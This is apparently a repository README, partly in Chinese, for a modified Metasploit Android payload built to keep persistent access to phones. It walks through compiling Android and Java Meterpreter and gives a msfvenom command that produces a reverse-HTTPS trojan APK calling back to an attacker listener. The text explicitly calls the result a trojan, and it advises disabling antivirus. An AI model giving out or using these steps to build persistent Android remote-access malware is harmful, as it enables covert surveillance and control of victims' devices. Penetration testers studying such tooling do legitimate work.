https://github.com/xiaohuanshu/persistent-androidpayload
修改Metasploit安卓Payload源码以实现持久化访问

# Building the Java and Android Meterpreter
只要下载java文件，AS打开androidpayload文件夹，但是mvn命令生成jar文件是在java目录下，而不是androidpayload目录——会出错。
pom.xml有感叹号错误不必理会，mvn package命令会下载缺失Maven文件

1. 根据自身的环境安装Maven(3.5以上版本) 和 Java8

apt-get update

apt-get -y install maven

update-alternatives  --config mvn

update-alternatives  --config javac


2. 安装 [Android SDK](https://developer.android.com/sdk/index.html), 和 [Android NDK](https://developer.android.com/tools/sdk/ndk/index.html) 

3. 安装 Android SDK Platforms最新29, 10 and 19, 并更新 "Android SDK Tools" 和 "Android SDK Platform-tools"

a. AS->File->Setting->System Setting->Android SDK->SDK Platforms
下载Android SDK Platforms——API version 最新的SDK（compileSdkVersion）29+10 +19

b. AS->File->Setting->System Setting->Android SDK->SDK Tools->Show Package Details打勾, 
Android SDK Build Tools
Android SDK Platform-Tools 29.0.5
Android SDK Tools 26.1.1
NDK(Side by side)20.0.055
Cmake 3.10.2
Android SDK Build-Tools 25.0.0(AhMyth)
Android Emulator 29.2.11

4. 编译AndroidPayload for Metasploit ... SUCCESS 即成功,并把编译新生成的/java/target/data中android文件夹——复制到Metasploit-framework根目录下的data文件夹。
Android 木马：
cd metasploit-payloads/tree/master/java
mvn package -Dandroid.sdk.path=/root/Android/sdk -Dandroid.release=true -P deploy
返回成功信息：
[INFO] AndroidPayload for Metasploit ...................... SUCCESS [  8.920 s]
[INFO] Android Meterpreter ................................ FAILURE [  4.153 s]
[INFO] BUILD FAILURE

cd /java/target/data
cp -r android /usr/share/metasploit-framework/data


java木马：mvn -D deploy.path=/usr/share/metasploit-framework -P deploy package

5.通过msfvenom命令生成APK:
msfvenom -p android/meterpreter_reverse_https  LHOST=10.10.10.102 LPORT=4444 -o payload.apk
返回信息：如果开头出现了这三个WARNING，说明msfvenom生成APK时使用的是我们修改后的版本。 
WARNING: Local file /usr/share/metasploit-framework/data/android/apk is being used
WARNING: Local files may be incompatible with the Metasploit Framework
WARNING: Local file /usr/share/metasploit-framework/data/android/apk/classes.dex is being used


## Building on OSX
```
brew cask install caskroom/versions/java8
brew cask install android-sdk
brew install maven
sdkmanager --licenses
sdkmanager "platforms;android-10"
sdkmanager "platforms;android-19"

#cd metasploit-payloads/java
mvn package -Dandroid.sdk.path=/usr/local/share/android-sdk -Dandroid.release=true -P deploy
```

## Compiling JavaPayload and Java Meterpreter manually

To compile JavaPayload (a Java stager / code loader) and Java Meterpreter for
Metasploit, you need Maven 3.1 or above (Maven 3.5 works at the time of this
writing), and a copy of JDK 8.0 or later. Ensure that `mvn` and `javac` are in
your path and work. Then run

```
mvn package
```

to package all the files needed for Java meterpreter. The two files that you will be generated are:

```
meterpreter/meterpreter/target/meterpreter.jar
meterpreter/stdapi/target/ext_server_stdapi.jar
```

To get Metasploit to use these files, you need to place them in a place where
it can find them. To automatically build and install these files into
Metasploit Framework for testing, run:

```
mvn -P deploy package
```

This will package all the files and copy them into the correct place for
Metasploit, assuming that the metasploit-framework repository is checked out in
an adjacent directory to this one. (`../../metasploit-framework/data/java`). If
you get spurious compilation errors, make sure that there is an exclude rule in
your antivirus for the Metasploit directory (or that your antivirus is
disabled).

If the path to your metasploit framework repository is not
`../../metasploit-framework`, but for example (with Kali Linux)

`/usr/share/metasploit-framework/`, set the deploy.path directive like so:

```
mvn -D deploy.path=/usr/share/metasploit-framework -P deploy package
```

When you are editing this or any other Meterpreter, you will want to make sure
that your copy of metasploit-framework is also up-to-date. We occasionally
update the network protocol between Metasploit and its Payloads, and if the two
do not match, things will probably not work. Metasploit will warn you the first
time it stages a development payload that it is doing so, and that the payload
and Metasploit framework may be incompatible.

Each time you make a change to your code, you must build and deploy the files
into metasploit-framework for it to see the updates. It is not necessary to
restart msfconsole when updating payloads however, as they are read from disk
each time. So, a reasonable strategy when debugging is to leave msfconsole
running with `exploit/multi/handler`, and just install and restage payloads as
needed.

When you are done editing and want to revert Metasploit to use the builtin
payloads, simply delete `data/meterpreter/*.jar` and `data/meterpreter/java`
from your Metasploit framework directory. It will then fall back to the
versions bundled with the metasploit-payloads Ruby gem.

# IDE Support

In case you want to edit/debug JavaPayload for Metasploit or Java Meterpreter
with an IDE, Maven provides plugins to auto-generate project files for your
favourite environment (at least for Eclipse, Netbeans or IntelliJ).

I use Eclipse, so to generate project files I use

```
mvn eclipse:eclipse
```

This will generate project files that can be imported via

**File->Import->Existing Projects into Workspace**

into your Eclipse workspace.

(Note that if this is your first Maven project you want to use in Eclipse, you
also have to run

```
mvn -Declipse.workspace=/path/to/your/workspace eclipse:configure-workspace
```

to set up path variables like `M2_REPO` to point to the correct location.)

For NetBeans or IntelliJ IDEA, refer to the documentation at

http://maven.apache.org/netbeans-module.html
http://maven.apache.org/plugins/maven-idea-plugin/



